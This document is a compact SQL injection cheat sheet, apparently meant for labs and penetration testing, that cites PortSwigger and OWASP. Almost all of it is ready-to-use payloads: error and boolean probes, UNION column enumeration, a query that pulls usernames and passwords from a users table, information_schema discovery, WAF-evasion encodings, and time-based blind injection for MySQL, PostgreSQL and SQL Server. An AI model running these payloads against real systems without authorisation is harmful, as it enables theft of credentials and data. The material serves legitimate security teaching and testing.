# SQL Injection Cheat Sheet

Quick reference for SQL injection techniques used during labs and VAPT.

---

## 1. Detection

```sql
'           -- single quote to break the query
''          -- double single quote to test escaping
;--         -- comment out rest of query
1=1--       -- always true condition
1=2--       -- always false condition
```

---

## 2. Column Enumeration

```sql
-- increment NULLs until query succeeds
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1 UNION SELECT NULL,NULL,NULL--
```

---

## 3. Find String Columns

```sql
-- replace NULL with 'a' one at a time to find string columns
1 UNION SELECT 'a',NULL,NULL--
1 UNION SELECT NULL,'a',NULL--
1 UNION SELECT NULL,NULL,'a'--
```

---

## 4. Extract Data

```sql
-- single column
1 UNION SELECT username FROM users--

-- multiple fields in one column
1 UNION SELECT username || '~' || password FROM users--

-- with table and column discovery
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name='users'
```

---

## 5. WAF Bypass

```sql
-- case variation
uNiOn SeLeCt

-- comments inside keywords
UN/**/ION SEL/**/ECT

-- XML hex entity encoding (for XML endpoints)
-- UNION SELECT encoded as hex entities
&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;
```

---

## 6. Blind SQLi

```sql
-- boolean based
1 AND 1=1--    -- true
1 AND 1=2--    -- false

-- time based
1; SELECT SLEEP(5)--          -- MySQL
1; SELECT pg_sleep(5)--       -- PostgreSQL
1; WAITFOR DELAY '0:0:5'--    -- Microsoft
```

---

## 7. Database Fingerprinting

```sql
SELECT @@version        -- MySQL / Microsoft
SELECT version()        -- PostgreSQL
SELECT banner FROM v$version  -- Oracle
```

---

## 8. Injection Points to Always Check

- URL parameters `?id=1`
- Form fields
- HTTP headers `User-Agent`, `X-Forwarded-For`, `Referer`
- Cookies
- XML body parameters
- JSON body parameters

---

## References

- [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger: Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
